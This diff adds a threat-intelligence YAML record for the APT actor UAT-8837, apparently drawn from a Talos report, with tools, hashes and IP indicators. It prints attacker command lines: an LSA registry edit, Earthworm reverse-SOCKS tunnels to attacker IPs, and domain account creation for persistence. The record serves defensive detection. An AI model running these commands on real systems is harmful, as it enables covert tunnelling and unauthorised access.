@@ -1,0 +1,99 @@
+description: UAT-8837, a China-nexus APT actor, targets critical infrastructure sectors
+  in North America using various tools and techniques to harvest sensitive information.
+attribution: China-nexus APT
+malware_families:
+- GoTokenTheft
+- Earthworm
+- DWAgent
+- SharpHound
+- Impacket
+- GoExec
+- SharpWMI
+- Rubeus
+- Certipy
+TTPs:
+  processes:
+  - cmd.exe
+  - powershell.exe
+  commandline:
+  - ping google[.]com
+  - tasklist /svc
+  - netstat -aon -p TCP
+  - whoami
+  - quser
+  - hostname
+  - net user
+  - REG ADD HKLM\\System\\CurrentControlSet\\Control\\Lsa /v DisableRestrictedAdmin
+    /t REG_DWORD /d 00000000 /f
+  powershell:
+  - Invoke-WMIExec.ps1
+  scripting_engine: []
+  registry_keys:
+  - HKLM\\System\\CurrentControlSet\\Control\\Lsa
+  image_load: []
+  network_connections:
+  - C:\\Windows\\Temp\\v.ico -s rssocks -d 172[.]188[.]162[.]183 -e 1433
+  - C:\\users\\public\\videos\\verr.ico -s rssocks -d 172[.]188[.]162[.]183 -e 443
+  - C:\\Windows\\Temp\\eir.ico -p 8888 -t 172[.]188[.]162[.]183 -f 11112
+  - cisos.ico -s rssocks -d 172[.]188[.]162[.]183 e80
+  - vgent.ico -s rssocks -d 172[.]188[.]162[.]183 -e 443
+  - vgent.ico -s rssocks -d 172[.]188[.]162[.]183 -e 447
+  - abc.ico -s rssocks -d 4[.]144[.]1[.]47 -e 448
+  - C:\\users\\public\\music\\aa.exe -s rssocks -d 74[.]176[.]166[.]174 -e 443
+  - C:\\Users\\public\\Music\\twd.exe -s rssocks -d 20[.]200[.]129[.]75 -e 443
+  file_activity:
+  - C:\\Users\\<user>\\Desktop\\go.exe
+  - C:\\Windows\\Temp\\SharpHound.exe
+  - C:\\Windows\\Temp\\wec.ico
+  - C:\\Windows\\Temp\\Invoke-WMIExec.ps1
+  - C:\\Windows\\Temp\\s.ico
+  - C:\\Windows\\Temp\\Certipy.exe
+  persistence:
+  - net user <user> <password> /add /domain
+  - net user <user>
+  - net localgroup <group> <user> /add
+  process_relations: []
+CVEs:
+- CVE-2025-53690
+IOCs:
+  hashes:
+  - 1b3856e5d8c6a4cec1c09a68e0f87a5319c1bd4c8726586fd3ea1b3434e22dfa
+  - 451e03c6a783f90ec72e6eab744ebd11f2bdc66550d9a6e72c0ac48439d774cd
+  - B3f83721f24f7ee5eb19f24747b7668ff96da7dfd9be947e6e24a688ecc0a52b
+  - Fab292c72ad41bae2f02ae5700c5a88b40a77f0a3d9cbdf639f52bc4f92bb0a6
+  - 4f7518b2ee11162703245af6be38f5db50f92e65c303845ef13b12c0f1fc2883
+  - 891246a7f6f7ba345f419404894323045e5725a2252c000d45603d6ddf697795
+  - 5090f311b37309767fb41fa9839d2770ab382326f38bab8c976b83ec727e6796
+  - 6e8af5c507b605a16373e8453782bfd8a3ec3bd76f891e71a159d8c2ff2a5bb0
+  - 887817fbaf137955897d62302c5d6a46d6b36cb34775e4693e30e32609fb6744
+  - 4af156b3285b49485ef445393c26ca1bb5bfe7cdc59962c5c5725e3f3c574f7c
+  - 1de72bb4f116e969faff90c1e915e70620b900e3117788119cffc644956a9183
+  - 51d6448e886521aaaaf929a50763156ceb99ede587c65de971700a5583d6a487
+  - 2f295f0cedc37b0e1ea22de9d8cb461fa6f84ab0673fde995fd0468a485ddb59
+  - E27e6e8e97421593f1e8d66f280e894525e22b373248709beaf81dc6107fb88d
+  - B7ecd4ff75c0e3ed196e1f53d92274b1e94f17fa6c39616ce0435503906e66fb
+  - 42e3ad56799fbc8223fb8400f07313559299496bb80582a6cbae29cb376d96c3
+  - 6d20371b88891a1db842d23085a0253e36cf3bf0691aee2ae15a66fc79f3803d
+  - 4e8304040055d3bffcb3551873da45f66577723d1a975416a49afa5aec4eb295
+  - BDF7B28DF19B6B634C05882D9F1DB73F63252F855120ED3E4DA4E26F2C6190E8
+  - 1c5174672bf2ccedb6a426336ca79fd326e61cd26dd9ae684b8ffd0b5a70c700
+  - d0beb6184ea4402c39e257d5912c7ace3607e908e76127014e3ec02866b6d70c
+  - 194ca1b09902ceaaa8a7e66234be9dc8a12572832836361f49f1074eae861794
+  - 74e68b4e07d72c9b8e0bc8cbfd57f980b4a2cd9d27c37bb097ca4fb2108706e3
+  - Ced14e8beb20a345a0d6f90041d8517c04dbc113feff3bc6e933968d6b846e31
+  - 8bf233f608ea508cd6bf51fb23053d97aa970b8d11269d60ce5c6e113e8e787a
+  - 5391f69425217fa8394ebac0d952c5a3d1f0f5ac4f20587978cd894fdb6199cd
+  - 4af156b3285b49485ef445393c26ca1bb5bfe7cdc59962c5c5725e3f3c574f7c
+ip_addresses:
+- 74.176.166.174
+- 20.200.129.75
+- 172.188.162.183
+- 4.144.1.47
+- 103.235.46.102
+authors:
+- Asheer Malhotra
+- Vitor Ventura
+- Brandon White
+reference: https://blog.talosintelligence.com/uat-8837/
+date_of_publication: January 15, 2026
+file_creation_date: January 19, 2026
